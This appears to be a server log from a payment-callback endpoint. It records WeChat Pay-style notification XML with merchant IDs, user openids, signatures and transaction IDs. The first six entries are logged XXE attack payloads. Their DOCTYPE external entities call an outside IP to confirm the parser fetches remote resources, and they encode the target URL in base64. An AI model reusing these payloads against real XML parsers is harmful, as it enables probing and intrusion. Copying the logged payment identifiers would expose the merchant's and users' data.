03:18:01|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019070803_79?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:18:01|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019070803_79?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
03:25:10|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019070803_79?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:25:10|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019070803_79?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
03:31:49|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019070803_79?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:31:49|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019070803_79?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
19:44:08|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d232c41bda08]]></nonce_str>
<openid><![CDATA[oGq4g5Ra_cTH8WwNMPOtYXpsWPKM]]></openid>
<out_trade_no><![CDATA[226061593016417903201]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[B3BFEB1A30A63243D7FFCCE72BF84316]]></sign>
<time_end><![CDATA[20190708194406]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000349201907087396887520]]></transaction_id>
</xml>'
| GET:array (
)
19:44:08|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d232c41bda08',
  'openid' => 'oGq4g5Ra_cTH8WwNMPOtYXpsWPKM',
  'out_trade_no' => '226061593016417903201',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => 'B3BFEB1A30A63243D7FFCCE72BF84316',
  'time_end' => '20190708194406',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000349201907087396887520',
)
| GET:array (
)
19:53:37|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d232eb5958d3]]></nonce_str>
<openid><![CDATA[oGq4g5Ra_cTH8WwNMPOtYXpsWPKM]]></openid>
<out_trade_no><![CDATA[218061593080284403201]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[2B43C551B754B39DE706255BFE1DB646]]></sign>
<time_end><![CDATA[20190708195336]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000343201907089325207050]]></transaction_id>
</xml>'
| GET:array (
)
19:53:37|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d232eb5958d3',
  'openid' => 'oGq4g5Ra_cTH8WwNMPOtYXpsWPKM',
  'out_trade_no' => '218061593080284403201',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '2B43C551B754B39DE706255BFE1DB646',
  'time_end' => '20190708195336',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000343201907089325207050',
)
| GET:array (
)
20:01:51|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5d2330a19c856]]></nonce_str>
<openid><![CDATA[oGq4g5Ra_cTH8WwNMPOtYXpsWPKM]]></openid>
<out_trade_no><![CDATA[258061593129505003201]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[EF847F3A13A498624F6AD33CC74A9A48]]></sign>
<time_end><![CDATA[20190708200150]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000354201907080011790650]]></transaction_id>
</xml>'
| GET:array (
)
20:01:51|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5d2330a19c856',
  'openid' => 'oGq4g5Ra_cTH8WwNMPOtYXpsWPKM',
  'out_trade_no' => '258061593129505003201',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => 'EF847F3A13A498624F6AD33CC74A9A48',
  'time_end' => '20190708200150',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000354201907080011790650',
)
| GET:array (
)
